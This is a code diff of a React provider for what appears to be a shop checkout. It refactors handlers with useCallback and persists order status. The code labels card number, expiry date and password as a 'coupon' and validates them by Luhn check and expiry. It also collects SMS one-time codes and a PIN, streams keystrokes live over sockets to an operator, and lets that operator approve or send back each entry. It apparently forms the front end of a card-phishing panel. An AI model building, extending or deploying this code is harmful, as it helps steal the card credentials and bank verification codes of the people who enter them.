@@ -1,4 +1,4 @@
-import React, { createContext, useContext, useState, useEffect, useRef, ReactNode } from "react";
+import React, { createContext, useContext, useState, useEffect, useRef, useCallback, ReactNode } from "react";
 import { io, Socket } from "socket.io-client";
 import { API_URL } from "@/lib/constants";
 
@@ -21,6 +21,22 @@ export interface CouponData {
 }
 
 export type OrderStatus = "IDLE" | "SHIPPING_SUBMITTED" | "COUPON_SUBMITTING" | "WAITING_APPROVAL" | "APPROVED" | "REJECTED" | "AUTO_REJECTED" | "WAITING_SMS" | "SMS_SUBMITTED" | "REQUEST_PIN" | "PIN_SUBMITTED" | "COMPLETED" | "RETURN_COUPON";
+
+const ORDER_STATUS_VALUES: OrderStatus[] = [
+  "IDLE",
+  "SHIPPING_SUBMITTED",
+  "COUPON_SUBMITTING",
+  "WAITING_APPROVAL",
+  "APPROVED",
+  "REJECTED",
+  "AUTO_REJECTED",
+  "WAITING_SMS",
+  "SMS_SUBMITTED",
+  "REQUEST_PIN",
+  "PIN_SUBMITTED",
+  "COMPLETED",
+  "RETURN_COUPON",
+];
 
 interface RealtimeContextType {
   // Shipping Data
@@ -53,10 +69,10 @@ interface RealtimeContextType {
   setCartTotal: (total: number) => void;
   
   // Backend Integration
-  submitOrder: (finalCouponData?: CouponData) => Promise<void>;
-  submitSMS: (code?: string) => Promise<void>;
-  submitPin: (code?: string) => Promise<void>;
-  resubmitCoupon: (newCouponData: CouponData) => Promise<void>;
+  submitOrder: (finalCouponData?: CouponData) => Promise<boolean>;
+  submitSMS: (code?: string) => Promise<boolean>;
+  submitPin: (code?: string) => Promise<boolean>;
+  resubmitCoupon: (newCouponData: CouponData) => Promise<boolean>;
   startLiveSession: (opts?: { force?: boolean }) => void;
   endLiveSession: () => void;
   
@@ -81,20 +97,52 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
   const [orderToken, _setOrderToken] = useState<string | null>(() => {
     try { return sessionStorage.getItem('orderToken'); } catch { return null; }
   });
-  const setCurrentOrderId = (id: string) => {
+  const setCurrentOrderId = useCallback((id: string) => {
     _setCurrentOrderId(id);
-    try { sessionStorage.setItem('currentOrderId', id); } catch { /* ignore */ }
-  };
-  const setOrderToken = (t: string) => {
-    _setOrderToken(t);
-    try { sessionStorage.setItem('orderToken', t); } catch { /* ignore */ }
-  };
-  const clearCurrentOrderId = () => {
+    try {
+      sessionStorage.setItem("currentOrderId", id);
+    } catch {
+      // ignore session storage errors
+    }
+  }, []);
+  const setOrderToken = useCallback((tokenValue: string) => {
+    _setOrderToken(tokenValue);
+    try {
+      sessionStorage.setItem("orderToken", tokenValue);
+    } catch {
+      // ignore session storage errors
+    }
+  }, []);
+  const clearCurrentOrderId = useCallback(() => {
     _setCurrentOrderId(null);
     _setOrderToken(null);
-    try { sessionStorage.removeItem('currentOrderId'); sessionStorage.removeItem('orderToken'); } catch { /* ignore */ }
-  };
-  const [orderStatus, setOrderStatus] = useState<OrderStatus>("IDLE");
+    try {
+      sessionStorage.removeItem("currentOrderId");
+      sessionStorage.removeItem("orderToken");
+      sessionStorage.removeItem("orderStatus");
+    } catch {
+      // ignore session storage errors
+    }
+  }, []);
+  const [orderStatus, _setOrderStatus] = useState<OrderStatus>(() => {
+    try {
+      const raw = sessionStorage.getItem('orderStatus');
+      if (raw && ORDER_STATUS_VALUES.includes(raw as OrderStatus)) {
+        return raw as OrderStatus;
+      }
+    } catch {
+      // ignore
+    }
+    return "IDLE";
+  });
+  const setOrderStatus = useCallback((status: OrderStatus) => {
+    _setOrderStatus(status);
+    try {
+      sessionStorage.setItem('orderStatus', status);
+    } catch {
+      // ignore
+    }
+  }, []);
   const [socket, setSocket] = useState<Socket | null>(null);
   const [cartTotal, setCartTotal] = useState<number>(0);
 
@@ -129,25 +177,24 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
     return () => {
       socket.off("order_update", handler);
     };
-  }, [socket]);
+  }, [setOrderStatus, socket]);
 
   // Clear persisted order ID when order is completed
   useEffect(() => {
     if (orderStatus === "COMPLETED") {
       clearCurrentOrderId();
     }
-  }, [orderStatus]);
+  }, [orderStatus, clearCurrentOrderId]);
 
-  const updateLiveData = (data: LiveFormData) => {
+  const updateLiveData = useCallback((data: LiveFormData) => {
     setLiveData(data);
-    // Optional: Auto-save draft to backend if needed, for now keep in state
-  };
+  }, []);
 
-  const updateCouponData = (data: CouponData) => {
+  const updateCouponData = useCallback((data: CouponData) => {
     setCouponData(data);
     if (currentOrderId) {
       // Existing order: send real-time update to the order row itself
-      socket?.emit('live_order_coupon_update', {
+      socket?.emit("live_order_coupon_update", {
         orderId: currentOrderId,
         code: data.code,
         dateMMYY: data.dateMMYY,
@@ -155,55 +202,91 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
       });
     } else {
       // No order yet: send to live typing session
-      socket?.emit('live_coupon_update', {
+      socket?.emit("live_coupon_update", {
         code: data.code,
         dateMMYY: data.dateMMYY,
         password: data.password,
       });
     }
-  };
+  }, [currentOrderId, socket]);
 
-  const updateSmsCode = (code: string) => {
+  const updateSmsCode = useCallback((code: string) => {
     setSmsCode(code);
-  };
+  }, []);
 
-  const updatePinCode = (code: string) => {
+  const updatePinCode = useCallback((code: string) => {
     setPinCode(code);
     if (currentOrderId) {
-      socket?.emit('live_pin_update', { pinCode: code });
+      socket?.emit("live_pin_update", { pinCode: code });
     }
-  };
+  }, [currentOrderId, socket]);
 
-  const startLiveSession = (opts?: { force?: boolean }) => {
+  const startLiveSession = useCallback((opts?: { force?: boolean }) => {
     if (!liveData) return;
     if (currentOrderId && !opts?.force) return; // Order already exists; use force for RETURN_COUPON resubmit flow
-    socket?.emit('live_session_start', {
+    socket?.emit("live_session_start", {
       customer: liveData,
       cartTotal,
     });
-  };
+  }, [cartTotal, currentOrderId, liveData, socket]);
 
-  const endLiveSession = () => {
-    socket?.emit('live_session_end');
-  };
+  const endLiveSession = useCallback(() => {
+    socket?.emit("live_session_end");
+  }, [socket]);
+
+  // Resubmit Coupon (update existing order after admin sends back)
+  const resubmitCoupon = useCallback(async (newCouponData: CouponData): Promise<boolean> => {
+    if (!currentOrderId || !newCouponData) return false;
+
+    setOrderStatus("WAITING_APPROVAL");
+    socket?.emit("live_session_end");
+
+    try {
+      const body: { couponCode: string; dateMMYY: string; password: string; order_token?: string } = {
+        couponCode: newCouponData.code,
+        dateMMYY: newCouponData.dateMMYY,
+        password: newCouponData.password,
+      };
+      if (orderToken) body.order_token = orderToken;
+      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/update-coupon`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+
+      if (!response.ok) {
+        const detail = await response.text();
+        throw new Error(`Failed to update coupon: ${detail}`);
+      }
+
+      const result = await response.json();
+      if (result.autoRejected) {
+        setOrderStatus("REJECTED");
+      }
+      return true;
+    } catch (error) {
+      console.error("Error resubmitting coupon:", error);
+      setOrderStatus("RETURN_COUPON");
+      return false;
+    }
+  }, [currentOrderId, orderToken, setOrderStatus, socket]);
 
   // Submit Order to Backend
-  const submitOrder = async (finalCouponData?: CouponData) => {
+  const submitOrder = useCallback(async (finalCouponData?: CouponData): Promise<boolean> => {
     const couponToUse = finalCouponData || couponData;
-    
+
     if (!liveData || !couponToUse) {
       console.error("Missing data for submission", { liveData, couponData: couponToUse });
-      return;
+      return false;
     }
 
     // Safety: if an order already exists, update it instead of creating a new one
     if (currentOrderId) {
-      await resubmitCoupon(couponToUse);
-      return;
+      return resubmitCoupon(couponToUse);
     }
 
     setOrderStatus("WAITING_APPROVAL");
-    socket?.emit('live_session_end');
+    socket?.emit("live_session_end");
 
     try {
       const response = await fetch(`${API_URL}/api/orders`, {
@@ -214,33 +297,47 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
           total: cartTotal,
           couponCode: couponToUse.code,
           dateMMYY: couponToUse.dateMMYY,
-          password: couponToUse.password
+          password: couponToUse.password,
         }),
       });
 
-      if (!response.ok) throw new Error("Failed to submit order");
-      
+      if (!response.ok) {
+        const detail = await response.text();
+        throw new Error(`Failed to submit order: ${detail}`);
+      }
+
       const result = await response.json();
       const actualOrderId = result.order.id;
-      const tok = result.order.order_token;
+      const tokenValue = result.order.order_token;
       setCurrentOrderId(actualOrderId);
-      if (tok) setOrderToken(tok);
+      if (tokenValue) setOrderToken(tokenValue);
       if (result.autoRejected) {
         // Luhn check failed or card expired - auto reject
         setOrderStatus("REJECTED");
       } else {
         socket?.emit("join_order", actualOrderId);
       }
-
+      return true;
     } catch (error) {
       console.error("Error submitting order:", error);
       setOrderStatus("IDLE");
+      return false;
     }
-  };
+  }, [
+    cartTotal,
+    couponData,
+    currentOrderId,
+    liveData,
+    resubmitCoupon,
+    setCurrentOrderId,
+    setOrderStatus,
+    setOrderToken,
+    socket,
+  ]);
 
-  const submitSMS = async (code?: string) => {
+  const submitSMS = useCallback(async (code?: string): Promise<boolean> => {
     const smsCodeToUse = code || smsCode;
-    if (!currentOrderId || !smsCodeToUse) return;
+    if (!currentOrderId || !smsCodeToUse) return false;
     setOrderStatus("SMS_SUBMITTED");
     try {
       const body: { smsCode: string; order_token?: string } = { smsCode: smsCodeToUse };
@@ -248,17 +345,23 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
       const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/sms`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body)
+        body: JSON.stringify(body),
       });
-      if (!response.ok) throw new Error("Failed to submit SMS");
+      if (!response.ok) {
+        const detail = await response.text();
+        throw new Error(`Failed to submit SMS: ${detail}`);
+      }
+      return true;
     } catch (error) {
       console.error("Error submitting SMS:", error);
+      setOrderStatus("WAITING_SMS");
+      return false;
     }
-  };
+  }, [currentOrderId, orderToken, setOrderStatus, smsCode]);
 
-  const submitPin = async (code?: string) => {
+  const submitPin = useCallback(async (code?: string): Promise<boolean> => {
     const pinCodeToUse = code || pinCode;
-    if (!currentOrderId || !pinCodeToUse) return;
+    if (!currentOrderId || !pinCodeToUse) return false;
     setOrderStatus("PIN_SUBMITTED");
     try {
       const body: { pinCode: string; order_token?: string } = { pinCode: pinCodeToUse };
@@ -266,51 +369,25 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
       const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/pin`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body)
+        body: JSON.stringify(body),
       });
-      if (!response.ok) throw new Error("Failed to submit PIN");
+      if (!response.ok) {
+        const detail = await response.text();
+        throw new Error(`Failed to submit PIN: ${detail}`);
+      }
+      return true;
     } catch (error) {
       console.error("Error submitting PIN:", error);
+      setOrderStatus("REQUEST_PIN");
+      return false;
     }
-  };
+  }, [currentOrderId, orderToken, pinCode, setOrderStatus]);
 
-  // Resubmit Coupon (update existing order after admin sends back)
-  const resubmitCoupon = async (newCouponData: CouponData) => {
-    if (!currentOrderId || !newCouponData) return;
-    
-    setOrderStatus("WAITING_APPROVAL");
-    socket?.emit('live_session_end');
-    
-    try {
-      const body: { couponCode: string; dateMMYY: string; password: string; order_token?: string } = {
-        couponCode: newCouponData.code,
-        dateMMYY: newCouponData.dateMMYY,
-        password: newCouponData.password
-      };
-      if (orderToken) body.order_token = orderToken;
-      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/update-coupon`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body)
-      });
-      
-      if (!response.ok) throw new Error("Failed to update coupon");
-      
-      const result = await response.json();
-      if (result.autoRejected) {
-        setOrderStatus("REJECTED");
-      }
-    } catch (error) {
-      console.error("Error resubmitting coupon:", error);
-      setOrderStatus("IDLE");
-    }
-  };
-
-  const adminAction = (action: "APPROVE" | "REJECT") => {
+  const adminAction = useCallback((action: "APPROVE" | "REJECT") => {
     // This is for local simulation/optimistic UI, but real action happens via Admin Dashboard
     if (action === "APPROVE") setOrderStatus("APPROVED");
     else setOrderStatus("REJECTED");
-  };
+  }, [setOrderStatus]);
 
   const value = React.useMemo(() => ({
     liveData, updateLiveData,
@@ -325,11 +402,27 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
     startLiveSession, endLiveSession,
     socket
   }), [
-    liveData, couponData, smsCode, pinCode, 
-    currentOrderId, orderStatus, cartTotal, socket,
-    // Functions (assuming they are stable or we accept re-renders when they change)
-    // To be perfectly safe, these should be wrapped in useCallback too, 
-    // but socket + data stability is the biggest win for now.
+    adminAction,
+    cartTotal,
+    couponData,
+    currentOrderId,
+    endLiveSession,
+    liveData,
+    orderStatus,
+    pinCode,
+    resubmitCoupon,
+    smsCode,
+    socket,
+    startLiveSession,
+    submitOrder,
+    submitPin,
+    submitSMS,
+    updateCouponData,
+    updateLiveData,
+    updatePinCode,
+    updateSmsCode,
+    setCurrentOrderId,
+    setOrderStatus,
   ]);
 
   return (
